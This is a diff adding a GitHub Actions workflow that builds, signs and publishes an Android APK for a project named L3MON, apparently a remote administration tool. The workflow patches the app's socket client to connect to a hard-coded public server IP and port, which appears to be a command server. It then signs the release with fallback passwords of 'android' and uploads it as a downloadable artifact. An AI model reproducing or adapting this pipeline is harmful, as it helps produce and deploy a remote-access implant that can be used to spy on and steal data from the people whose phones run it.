@@ -1,0 +1,116 @@
+name: Build and Sign APK
+
+on:
+  push:
+    branches: [ master, main ]
+  pull_request:
+    branches: [ master, main ]
+  workflow_dispatch:
+
+env:
+  SERVER_IP: "109.123.245.161"
+  SERVER_PORT: "22222"
+
+jobs:
+  build:
+    name: Build & Sign APK
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 11
+        uses: actions/setup-java@v4
+        with:
+          java-version: '11'
+          distribution: 'temurin'
+
+      - name: Setup Android SDK
+        uses: android-actions/setup-android@v3
+
+      - name: Patch server IP in IOSocket.java
+        run: |
+          sed -i "s|http://192.168.0.91:22222|http://${{ env.SERVER_IP }}:${{ env.SERVER_PORT }}|g" \
+            client/app/src/main/java/com/etechd/l3mon/IOSocket.java
+          echo "Patched IOSocket.java:"
+          grep -n "ioSocket = IO.socket" client/app/src/main/java/com/etechd/l3mon/IOSocket.java
+
+      - name: Make gradlew executable
+        run: chmod +x client/gradlew
+
+      - name: Build APK with Gradle
+        working-directory: client
+        run: ./gradlew assembleRelease --no-daemon
+
+      - name: Generate signing keystore
+        if: ${{ secrets.KEYSTORE_BASE64 == '' }}
+        run: |
+          keytool -genkeypair \
+            -v \
+            -keystore /tmp/release-key.jks \
+            -keyalg RSA \
+            -keysize 2048 \
+            -validity 10000 \
+            -alias l3mon \
+            -storepass android \
+            -keypass android \
+            -dname "CN=L3MON, OU=Dev, O=L3MON, L=Unknown, ST=Unknown, C=US"
+
+      - name: Decode keystore from secrets
+        if: ${{ secrets.KEYSTORE_BASE64 != '' }}
+        env:
+          KEYSTORE_BASE64: ${{ secrets.KEYSTORE_BASE64 }}
+        run: echo "$KEYSTORE_BASE64" | base64 -d > /tmp/release-key.jks
+
+      - name: Sign APK with apksigner
+        run: |
+          # Find the unsigned release APK
+          APK_PATH=$(find client/app/build/outputs/apk/release -name "*.apk" | head -1)
+          if [ -z "$APK_PATH" ]; then
+            echo "Error: No APK found in client/app/build/outputs/apk/release/"
+            exit 1
+          fi
+          echo "Found APK: $APK_PATH"
+
+          STORE_PASSWORD="${{ secrets.KEYSTORE_PASSWORD }}"
+          KEY_PASSWORD="${{ secrets.KEY_PASSWORD }}"
+          KEY_ALIAS="${{ secrets.KEY_ALIAS }}"
+
+          # Use defaults if secrets are not configured
+          STORE_PASSWORD="${STORE_PASSWORD:-android}"
+          KEY_PASSWORD="${KEY_PASSWORD:-android}"
+          KEY_ALIAS="${KEY_ALIAS:-l3mon}"
+
+          # Find apksigner from Android SDK build-tools
+          APKSIGNER=$(find "$ANDROID_HOME/build-tools" -name "apksigner" | sort -V | tail -1)
+          if [ -z "$APKSIGNER" ]; then
+            echo "Error: apksigner not found in Android SDK build-tools"
+            exit 1
+          fi
+          echo "Using apksigner: $APKSIGNER"
+
+          # Sign the APK
+          $APKSIGNER sign \
+            --ks /tmp/release-key.jks \
+            --ks-pass "pass:${STORE_PASSWORD}" \
+            --ks-key-alias "${KEY_ALIAS}" \
+            --key-pass "pass:${KEY_PASSWORD}" \
+            --out client/app/build/outputs/apk/release/L3MON-signed.apk \
+            "$APK_PATH"
+
+          # Verify the signature
+          $APKSIGNER verify --verbose client/app/build/outputs/apk/release/L3MON-signed.apk
+
+      - name: Upload signed APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: L3MON-signed-apk
+          path: client/app/build/outputs/apk/release/L3MON-signed.apk
+          retention-days: 30
+
+      - name: Clean up keystore
+        if: always()
+        run: rm -f /tmp/release-key.jks
